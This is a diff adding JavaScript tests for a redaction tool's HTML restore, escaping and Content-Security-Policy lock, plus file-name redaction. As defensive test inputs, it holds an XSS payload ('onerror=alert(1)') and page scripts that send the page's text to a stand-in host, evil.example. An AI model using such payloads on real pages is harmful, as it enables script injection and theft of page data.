@@ -698,7 +698,7 @@ test("a second key never replaces one with placeholders that haven't been saved"
   assert.equal(R.keySwap({ ...GUARD_KEY, entries: [] }, false, GUARD_KEY), "load");
   assert.equal(R.keySwap(GUARD_KEY, true, other), "load");
   assert.equal(R.keySwap(GUARD_KEY, false, other), "refuse");
-  assert.equal(R.keySwap(GUARD_KEY, false, JSON.parse(JSON.stringify(GUARD_KEY))), "same");
+  assert.equal(R.keySwap(GUARD_KEY, false, JSON.parse(JSON.stringify(GUARD_KEY))), "load");
 });
 
 test("a key may carry the profile it was made with; anything malformed in it refuses the whole key", () => {
@@ -745,4 +745,107 @@ test("mergeLines adds what a list lacks and keeps what was typed", () => {
   assert.equal(R.mergeLines("Acme\nbest byte\n", "Best Byte\nValuMart\n\nValuMart"), "Acme\nbest byte\nValuMart");
   assert.equal(R.mergeLines("Acme", ""), "Acme");
   assert.equal(R.mergeLines("Rachel Kim | Rach", "Rachel Kim | Rach\nMarcus Webb"), "Rachel Kim | Rach\nMarcus Webb");
+});
+
+test("a web page restores with each real value escaped, so it can't break the page or run", () => {
+  const key = { entries: [
+    { placeholder: "[ACCOUNT-NAME-1]", value: "Smith & Co", kind: "COLUMN" },
+    { placeholder: "[OPPORTUNITY-OWNER-1]", value: "<img src=x onerror=alert(1)>", kind: "COLUMN" },
+    { placeholder: "[CONTACT-NAME-1]", value: `O'Brien "Bo"`, kind: "COLUMN" },
+  ] };
+  const page = `<!doctype html><title>[ACCOUNT-NAME-1]</title><td>[OPPORTUNITY-OWNER-1]</td><p>[CONTACT-NAME-1] at [ACCOUNT-NAME-1]</p><a href="https://x.example/?a=[ACCOUNT-NAME-1]">link</a><script>const d = "[ACCOUNT-NAME-1]";</script>`;
+  const r = R.restoreHtml(page, key);
+  assert.ok(r.text.includes("<title>Smith &amp; Co</title>"));
+  assert.ok(r.text.includes("<td>&lt;img src=x onerror=alert(1)&gt;</td>"), "markup in a value is text, not a tag");
+  assert.ok(!r.text.includes("<img"), "no new element");
+  assert.ok(r.text.includes("<p>O&#39;Brien &quot;Bo&quot; at Smith &amp; Co</p>"));
+  assert.ok(r.text.includes('const d = "Smith &amp; Co";'), "a value in a script string can't close it (and the lock stops scripts anyway)");
+  assert.ok(r.text.includes("?a=[ACCOUNT-NAME-1]"), "never inside a link");
+  assert.equal(r.inLinks, 1);
+  assert.equal(r.unknown.length, 0);
+  // Plain restore is unchanged: text answers get the raw value.
+  assert.equal(R.restore("[ACCOUNT-NAME-1]", key).text, "Smith & Co");
+});
+
+test("a restored web page is locked: it can't load or send anything", () => {
+  const key = { entries: [{ placeholder: "[ACCOUNT-NAME-1]", value: "Best Byte", kind: "COLUMN" }] };
+  const r = R.restoreHtml(`<!doctype html><html><head><title>x</title><script>fetch("https://evil.example/?n="+document.body.innerText)</script></head><body>[ACCOUNT-NAME-1]</body></html>`, key);
+  const head = r.text.slice(0, r.text.indexOf("<title>"));
+  assert.match(head, /Content-Security-Policy/, "the lock comes before anything in <head>");
+  assert.match(r.text, /connect-src 'none'/);
+  assert.match(r.text, /default-src 'none'/);
+  assert.match(r.text, /form-action 'none'/);
+  assert.match(r.text, /script-src 'none'/, "no scripts at all: a script could navigate away with the names");
+  assert.ok(R.hasScript(r.text));
+  // First in the file, or right after a doctype that comes first: never after
+  // a tag the page wrote, since a page can put code before its <head>.
+  const LOCK = '<meta charset="utf-8"><meta http-equiv="Content-Security-Policy"';
+  assert.ok(R.restoreHtml("<!doctype html><html lang=en><body>[ACCOUNT-NAME-1]</body></html>", key).text.startsWith("<!doctype html>" + LOCK));
+  assert.ok(R.restoreHtml("<p>[ACCOUNT-NAME-1]</p>", key).text.startsWith(LOCK));
+  for (const page of [
+    "<!doctype html><html><script>location='https://evil.example/?d='+document.body.innerText</script><head></head><body>[ACCOUNT-NAME-1]</body></html>",
+    "<!doctype html><!-- <head> --><html><head></head><body>[ACCOUNT-NAME-1]<script>fetch('https://evil.example')</script></body></html>",
+    '<!doctype html><html><head data-x="a>b"><title>t</title></head><body>[ACCOUNT-NAME-1]</body></html>',
+    "<!doctype html><p>x</p><head></head><body>[ACCOUNT-NAME-1]</body>",
+    "<p>x</p><!doctype html><head></head>[ACCOUNT-NAME-1]",
+  ]) {
+    const out = R.restoreHtml(page, key).text;
+    const at = out.indexOf(LOCK);
+    assert.ok(at >= 0 && /^(\uFEFF?\s*<!doctype[^>]*>)?$/i.test(out.slice(0, at)), `lock first in: ${page.slice(0, 40)}`);
+  }
+  // A ">" inside a quoted attribute doesn't end the tag: a placeholder after it stays put.
+  const q = R.restoreHtml('<a title="x>y" href="[ACCOUNT-NAME-1]">[ACCOUNT-NAME-1]</a>', key);
+  assert.ok(q.text.includes('href="[ACCOUNT-NAME-1]"'));
+  assert.ok(q.text.includes(">Best Byte</a>"));
+  assert.equal(q.replaced, 1);
+  assert.equal(q.inLinks, 1);
+  // A placeholder in a refresh address or any tag is never restored.
+  assert.ok(R.restoreHtml('<meta http-equiv="refresh" content="0;url=https://x.example/?n=[ACCOUNT-NAME-1]">', key).text.includes("?n=[ACCOUNT-NAME-1]"));
+  // Many rows: every placeholder in text comes back, every one inside a tag stays,
+  // however the two interleave (the tag check walks the page once, in order).
+  const rows = Array.from({ length: 300 }, (_, i) => (i % 3 ? `<tr data-n="${i}"><td title="[ACCOUNT-NAME-1]">[ACCOUNT-NAME-1]</td></tr>` : `<tr><td>${i}</td><td>[ACCOUNT-NAME-1] and [ACCOUNT-NAME-1]</td></tr>`)).join("");
+  const many = R.restoreHtml(`<table>${rows}</table>`, key);
+  assert.equal(many.replaced, 200 + 200);
+  assert.equal(many.inLinks, 200);
+  assert.equal((many.text.match(/title="\[ACCOUNT-NAME-1\]"/g) || []).length, 200);
+  assert.equal((many.text.match(/>Best Byte</g) || []).length, 200);
+  // A refresh or prefetch needs no code, so the page's own are switched off,
+  // however the value is spelled; the lock's policy is the only one left.
+  for (const tag of [
+    '<meta http-equiv="refresh" content="0;url=https://x.example/">',
+    '<META HTTP-EQUIV = "&#114;efresh" content="0;url=https://x.example/">',
+    '<meta a="x"http-equiv=refresh content="0;url=https://x.example/">',
+    '<link rel="dns-prefetch" href="https://x.example">',
+    '<link/rel=preconnect href="https://x.example">',
+  ]) {
+    const out = R.restoreHtml(tag + "<p>[ACCOUNT-NAME-1]</p>", key).text;
+    assert.equal((out.match(/(?<![\w-])(?:http-equiv|rel)\s*=/gi) || []).length, 1, `switched off: ${tag}`);
+    assert.ok(out.startsWith(LOCK));
+  }
+  assert.ok(R.restoreHtml('<p>Contact: rel = partner</p>', key).text.includes("data-off-rel = partner")); // the cost: visible text is changed too, rarely
+});
+
+test("a value the opened key already holds is hidden in the next text, with its own placeholder", () => {
+  const first = new R.Session();
+  R.redactCsv("Account,Contact\nBest Byte,Keisha Daniels\n", { lists: {} }, first, ["mask", "mask"]);
+  const saved = JSON.parse(JSON.stringify(first.key));
+  const keisha = saved.entries.find((e) => e.value === "Keisha Daniels").placeholder;
+  const next = new R.Session(saved);
+  const out = R.redactText("Keisha Daniels at Best Byte wants samples.", { lists: {} }, next);
+  assert.equal(out, `${keisha} at ${saved.entries.find((e) => e.value === "Best Byte").placeholder} wants samples.`);
+  // Your own list still wins for a name you type, and nothing is added to the key twice.
+  const typed = R.redactText("Keisha Daniels", { lists: { PERSON: "Keisha Daniels" } }, new R.Session(saved));
+  assert.match(typed, /^\[PERSON-01\]$/);
+  // Too short to be safe on its own: left to the lists, as the leak check does.
+  assert.deepEqual([...R.knownTerms(new R.Session({ entries: [{ placeholder: "[X-1]", value: "AB", kind: "TERM" }] }))], []);
+});
+
+test("a file's name is redacted with the same lists, in any case, and restores", () => {
+  const options = { lists: { PRODUCT: "Project Kestrel | Kestrel", COMPANY: "Best Byte" } };
+  const s = new R.Session();
+  assert.equal(R.redactText("Project Kestrel at Best Byte", options, s), "[PRODUCT-01] at [COMPANY-01]");
+  assert.equal(R.redactName("kestrel-launch-plan.pptx", options, s), "[PRODUCT-01]-launch-plan.pptx");
+  assert.equal(R.redactName("best-byte_recap.csv", options, s), "[COMPANY-01]_recap.csv");
+  assert.equal(R.redactName("q3-sell-through.csv", options, s), "q3-sell-through.csv");
+  assert.equal(R.restore("[PRODUCT-01]-launch-plan.pptx", s.key).text, "Project Kestrel-launch-plan.pptx");
 });
